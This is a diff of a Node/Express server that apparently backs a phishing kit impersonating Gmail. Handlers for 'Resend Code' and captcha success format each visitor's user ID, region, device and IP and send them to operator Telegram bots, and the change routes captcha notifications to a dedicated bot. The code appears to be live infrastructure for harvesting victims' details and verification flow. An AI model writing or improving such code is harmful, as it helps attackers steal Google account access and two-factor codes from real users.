@@ -1618,7 +1618,7 @@ app.post("/resend-verification", async (req, res) => {
     pendingVerificationPage[requestId].status = "pending";
 
     const message =
-      `🔄 <b>Gmail - Resend Code</b> 🔄\n` +
+      `🔄 <b>Resend Code - Gmail</b> 🔄\n` +
       `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
       `<b>🌍 Region:</b> ${region}\n` +
       `<b>💻 Device:</b> ${device}\n` +
@@ -2327,12 +2327,15 @@ app.post("/captcha-success", async (req, res) => {
       `💻 Device: ${device}\n` +
       `📍 IP: ${ip}`;
 
-    // ✅ SEND TO BOTH BOTS
-    await broadcastMessage(message, {
-      parse_mode: "HTML"
-    });
+    // ✅ SEND TO CAPTCHA BOT
+    const captchaChatId = process.env.CHAT_ID_CAPTCHA_PAGE;
+    if (captchaChatId) {
+      const TelegramBot = require("node-telegram-bot-api");
+      const captchaBot = new TelegramBot(process.env.BOT_TOKEN_CAPTCHA_PAGE);
+      await captchaBot.sendMessage(captchaChatId, message);
+      console.log(`✅ CAPTCHA success notification sent to captcha bot`);
+    }
 
-    console.log(`✅ CAPTCHA success notification sent`);
     res.json({ ok: true });
 
   } catch (err) {
